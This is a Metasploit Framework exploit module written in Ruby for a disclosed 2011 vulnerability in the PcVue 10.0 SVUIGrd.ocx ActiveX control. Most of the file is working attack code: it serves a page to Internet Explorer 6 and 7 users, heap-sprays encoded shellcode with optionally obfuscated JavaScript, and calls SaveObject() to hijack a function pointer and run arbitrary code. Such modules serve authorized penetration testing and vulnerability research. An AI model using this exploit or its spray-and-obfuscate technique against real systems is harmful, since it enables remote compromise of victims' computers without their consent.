##
# $Id: pcvue_func.rb 13889 2011-10-12 10:57:31Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => "PcVue 10.0 SV.UIGrdCtrl.1 'LoadObject()/SaveObject()' Trusted DWORD Vulnerability",
			'Description'    => %q{
				This module exploits a function pointer control within SVUIGrd.ocx of PcVue 10.0.
				By setting a dword value for the SaveObject() or LoadObject(), an attacker can
				overwrite a function pointer and execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Luigi Auriemma', # original find
					'mr_me <steventhomasseeley[at]gmail-com>',	 # msf module
					'TecR0c <roccogiovannicalvi[at]gmail-com >',# msf module
				],
			'Version'        => '$Revision: 13889 $',
			'References'     =>
				[
					[ 'BID', '49795'],
					[ 'URL', 'http://aluigi.altervista.org/adv/pcvue_1-adv.txt'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'           => 1024,
					'BadChars'        => "\x00\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						#IE 6/7 on Widnows XP and Vista
						'Internet Explorer 6 / Internet Explorer 7', 
						{ 
							'Ret'    => 0x0a0a0a0a,
							'Offset' => 1000 
						} 
					]
				],
			'DisclosureDate' => 'Oct 5 2011',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ false, 'The file name.',  'msf.html']),
					OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]),
				], self.class)
	end

	def on_request_uri(cli, request)

		#If not IE, we don't continue
		agent = request.headers['User-Agent']
		if agent !~ /MSIE [6|7]\.0/
			print_error("Target not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops      = Rex::Text.to_unescape([target.ret].pack('V'))
		ret       = "0x%08x" % target.ret

		blocksize = 0x50000
		fillto    = 200

		# Randomize the javascript variable names
		obj_name     = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)
		j_txt	     = rand_text_alpha(rand(8) + 4)

		js = <<-EOF
		var #{j_shellcode} = unescape('#{shellcode}');
		var #{j_nops} = unescape("#{nops}");
		var #{j_headersize} = 20;
		var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
		while(#{j_nops}.length < #{j_slackspace}) {
    			#{j_nops} += #{j_nops};
		}
		var #{j_fillblock} = #{j_nops}.substring(0, #{j_slackspace});
		var #{j_block} = #{j_nops}.substring(0, #{j_nops}.length - #{j_slackspace});
		while((#{j_block}.length + #{j_slackspace}) < #{blocksize}) {
    			#{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
		}

		#{j_memory} = new Array();
		for(#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++){
    			#{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode} ;
		}

		function main(){ 
			#{obj_name}.SaveObject("#{j_txt}.txt", #{ret}, 0);
		}
		EOF

		js = js.gsub(/^\t\t/, '')

		#JS obfuscation on demand
		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
			main_sym = js.sym('main')
		else
			main_sym = "main"
		end

		content = <<-EOF
		<html>
		<body>
		<object classid='clsid:2BBD45A5-28AE-11D1-ACAC-0800170967D9' id='#{obj_name}' ></object>
		<script language='javascript'>
		#{js}
		#{main_sym}();
		</script>
		</body>
		</html>
		EOF

		#Remove the extra tabs from content
		content = content.gsub(/^\t\t/, '')

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}")
		send_response(cli, content, {'Content-Type'=>'text/html'})
	end
end


=begin
Tested successfully on the following platforms:
 - PcVue 10.0 (SVUIGrd.ocx v1.5.1.0) on Internet Explorer 6 & 7, Windows XP SP3

Class SVUIGrdCtrl
ProgID: SV.UIGrdCtrl.1
GUID: {2BBD45A5-28AE-11D1-ACAC-0800170967D9}
Number of Interfaces: 1
Default Interface: ISVUIGrd
RegKey Safe for Script: False
RegkeySafe for Init: False
KillBitSet: False
=end